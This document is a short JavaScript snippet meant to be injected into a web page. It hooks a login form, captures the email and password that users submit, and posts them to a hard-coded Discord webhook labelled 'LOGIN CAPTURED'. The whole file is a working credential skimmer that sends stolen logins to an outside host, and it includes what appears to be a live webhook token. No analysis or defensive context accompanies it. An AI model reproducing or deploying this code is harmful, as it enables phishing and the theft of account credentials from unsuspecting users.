// Add this script to the page
(function() {
    console.log('Webhook script loaded');
    
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G";
    
    // Wait for page to load
    setTimeout(function() {
        const form = document.querySelector('form[id="login-form"]');
        if (!form) {
            console.error('Form not found!');
            return;
        }
        
        console.log('Form found, attaching listener');
        
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            e.stopImmediatePropagation();
            
            console.log('Form intercepted!');
            
            const email = document.getElementById('email')?.value;
            const password = document.getElementById('password')?.value;
            
            if (!email || !password) {
                alert('Fill both fields');
                return;
            }
            
            console.log('Captured:', email, password);
            
            // Send to webhook
            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    content: `**LOGIN CAPTURED**\nEmail: ${email}\nPassword: ${password}`
                })
            })
            .then(response => {
                console.log('Webhook response:', response.status);
                if (response.ok) {
                    alert('Data logged successfully!');
                    form.reset();
                } else {
                    alert('Webhook failed: ' + response.status);
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Failed to send data');
            });
            
            return false;
        }, true); // Use capture phase
        
    }, 1000);
})();
